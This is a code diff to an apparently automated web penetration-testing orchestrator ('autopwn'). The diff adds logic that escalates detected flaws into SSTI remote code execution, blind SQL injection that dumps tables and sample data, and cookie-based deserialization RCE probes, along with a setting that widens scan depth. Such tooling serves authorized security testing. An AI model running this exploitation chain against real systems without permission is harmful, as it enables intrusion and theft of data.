@@ -13,10 +13,11 @@ from __future__ import annotations
 import asyncio
 import json
 from typing import TYPE_CHECKING, Any
-from urllib.parse import urljoin
+from urllib.parse import parse_qs, quote, urljoin, urlparse, urlunparse
 
 from agents import RunContextWrapper, function_tool
 
+from strix.config.settings import depth_cap
 from strix.report.state import get_global_report_state
 from strix.tools.authz_matrix.tools import _authz_matrix_impl
 from strix.tools.backend_rules_probe.tools import _backend_rules_probe_impl
@@ -24,17 +25,22 @@ from strix.tools.chain_suggest.tools import _chain_suggest_impl
 from strix.tools.cors_probe.tools import _cors_probe_impl
 from strix.tools.data_exposure.tools import _data_exposure_impl
 from strix.tools.deep_fuzz.tools import _deep_fuzz_impl
+from strix.tools.deserial_probe.tools import _deserial_impl
+from strix.tools.deserial_probe.tools import fingerprint as _deserial_fingerprint
 from strix.tools.discovery.tools import _content_discover_impl, _param_discover_impl
 from strix.tools.error_leak.tools import _error_leak_impl
 from strix.tools.frontend_secret_scan.tools import _frontend_secret_scan_impl
 from strix.tools.graphql_deep.tools import _graphql_field_leak_impl
 from strix.tools.header_leak.tools import _header_leak_impl
+from strix.tools.http_replay.tools import _replay_impl
 from strix.tools.injection_fuzz.tools import _injection_fuzz_impl
 from strix.tools.oast.client import get_domain as _oast_get_domain
 from strix.tools.oast.client import poll as _oast_poll
 from strix.tools.profile_target.tools import _profile_target_impl
 from strix.tools.security_headers.tools import _security_headers_impl
+from strix.tools.sqli_dump.tools import _sqli_impl
 from strix.tools.ssr_leak.tools import _ssr_leak_impl
+from strix.tools.ssti_rce.tools import _ssti_impl
 from strix.tools.storage_probe.tools import _storage_probe_impl
 
 
@@ -63,6 +69,28 @@ def _finding(
         "verified": verified,
         "detail": detail,
     }
+
+
+def _slot_after_param(url: str, param: str) -> str:
+    """Return ``url`` with a ``{PAYLOAD}`` slot right after ``param``'s value.
+
+    Lets the SQLi engine splice inference SQL after the injectable parameter even
+    when it isn't the last one in the query string.
+    """
+    parsed = urlparse(url)
+    pairs = parse_qs(parsed.query, keep_blank_values=True)
+    parts: list[str] = []
+    seen = False
+    for key, vals in pairs.items():
+        val = vals[-1]
+        if key == param:
+            seen = True
+            parts.append(f"{quote(key)}={quote(val or '1')}{{PAYLOAD}}")
+        else:
+            parts.append(f"{quote(key)}={quote(val)}")
+    if not seen:
+        parts.append(f"{quote(param)}=1{{PAYLOAD}}")
+    return urlunparse(parsed._replace(query="&".join(parts)))
 
 
 def _autopwn_impl(  # noqa: PLR0915
@@ -159,10 +187,115 @@ def _autopwn_impl(  # noqa: PLR0915
         for f in content.get("found", []):
             endpoints.add(urljoin(seed_url, f["path"]))
 
+    def _escalate(esc_url: str, pnames: list[str], fuzz_findings: list[dict[str, Any]]) -> bool:
+        # Turn an injection *signal* into proven impact: SSTI->RCE and blind SQLi
+        # ->data extraction. Confirmation stays non-destructive (sleep/OAST); the
+        # extracted sample is bounded by the sqli engine's own caps.
+        esc = False
+        ssti = _safe(
+            lambda: _ssti_impl(
+                esc_url,
+                pnames[0],
+                "query",
+                None,
+                None,
+                "GET",
+                headers,
+                None,
+                oast_domain or "",
+                timeout,
+            )
+        )
+        if ssti.get("vulnerable"):
+            esc |= add(
+                "rce",
+                f"SSTI to RCE in {esc_url} ({ssti.get('engine') or 'template engine'})",
+                "critical",
+                ssti,
+                lambda: _safe(
+                    lambda: _ssti_impl(
+                        esc_url, pnames[0], "query", None, None, "GET", headers, None, "", timeout
+                    )
+                ).get("vulnerable", False),
+            )
+        sql_params = [
+            f.get("param")
+            for f in fuzz_findings
+            if "sql" in str(f.get("family", "")).lower() and f.get("param")
+        ]
+        if sql_params:
+            slot = _slot_after_param(esc_url, str(sql_params[0]))
+            dump = _safe(
+                lambda: _sqli_impl(
+                    slot, "time", None, None, "GET", headers, None, 3, 5, 2, 40, timeout
+                )
+            )
+            if dump.get("vulnerable"):
+                esc |= add(
+                    "injection",
+                    f"Blind SQLi data extraction on {esc_url} ({dump.get('dbms')})",
+                    "critical",
+                    {
+                        "dbms": dump.get("dbms"),
+                        "version": dump.get("version"),
+                        "tables": dump.get("tables"),
+                        "sample": dump.get("sample"),
+                    },
+                )
+        return esc
+
+    def _pivot_deserial() -> bool:
+        # Grab the seed's Set-Cookie, fingerprint each cookie, and if any looks
+        # serialized, run the deserialization RCE probe against it.
+        resp = _safe(
+            lambda: _replay_impl("GET", seed_url, headers, None, timeout, allow_redirects=True)
+        )
+        if not resp.get("success"):
+            return False
+        raw_cookie = ""
+        for hk, hv in (resp.get("response_headers") or {}).items():
+            if hk.lower() == "set-cookie":
+                raw_cookie = str(hv)
+                break
+        found = False
+        for chunk in raw_cookie.split(","):
+            pair = chunk.strip().split(";", 1)[0]
+            cname, sep, cval = pair.partition("=")
+            if not sep or not _deserial_fingerprint(cval):
+                continue
+            cn = cname.strip()
+
+            def _run_deserial(cn: str = cn, cv: str = cval) -> dict[str, Any]:
+                return _deserial_impl(
+                    seed_url,
+                    "cookie",
+                    cn,
+                    cv,
+                    None,
+                    None,
+                    "GET",
+                    headers,
+                    None,
+                    "base64",
+                    None,
+                    oast_domain or "",
+                    timeout,
+                )
+
+            d = _safe(_run_deserial)
+            if d.get("vulnerable"):
+                found |= add(
+                    "rce",
+                    f"Insecure deserialization RCE via cookie '{cname.strip()}'",
+                    "critical",
+                    d,
+                )
+        return found
+
     def _probe_endpoint(url: str) -> bool:
         found = False
         params = _safe(lambda: _param_discover_impl(url, headers, None, timeout))
-        pnames = [p["param"] for p in params.get("hidden_params", [])][:6]
+        pnames = [p["param"] for p in params.get("hidden_params", [])][: depth_cap(6, 30)]
         if pnames:
             fuzz = _safe(
                 lambda: _deep_fuzz_impl("GET", url, pnames, headers, None, "query", 120, timeout)
@@ -180,6 +313,7 @@ def _autopwn_impl(  # noqa: PLR0915
                         "GET", url, pnames, headers, None, "query", oast_domain, timeout
                     )
                 )
+            found |= _escalate(url, pnames, fuzz.get("findings", []))
         cors = _safe(lambda: _cors_probe_impl(url, "GET", None, timeout))
         if cors.get("possible_cors_issue"):
             found |= add(
@@ -239,7 +373,11 @@ def _autopwn_impl(  # noqa: PLR0915
             return False
         m = _safe(
             lambda: _authz_matrix_impl(
-                list(processed or endpoints)[:20], identities, headers, timeout, 200
+                list(processed or endpoints)[: depth_cap(20, 100)],
+                identities,
+                headers,
+                timeout,
+                200,
             )
         )
         found = False
@@ -263,16 +401,20 @@ def _autopwn_impl(  # noqa: PLR0915
 
     _harvest_seed()
     passes = 0
-    max_passes = max(1, min(max_passes, 4))
+    # Max-depth raises both the floor (run more passes even if asked for few) and
+    # the ceiling; normal mode keeps the 1..4 bound.
+    max_passes = max(depth_cap(1, 8), min(max_passes, depth_cap(4, 12)))
     while passes < max_passes:
         passes += 1
         new = False
-        for url in [e for e in list(endpoints) if e not in processed][:12]:
+        for url in [e for e in list(endpoints) if e not in processed][: depth_cap(12, 60)]:
             processed.add(url)
             new |= _probe_endpoint(url)
         new |= _pivot_supabase()
         new |= _pivot_graphql()
         new |= _pivot_authz()
+        if passes == 1:  # deserial pivot is seed-scoped; one shot is enough
+            new |= _pivot_deserial()
         new |= _poll_oast()
         if not new and endpoints <= processed:
             break
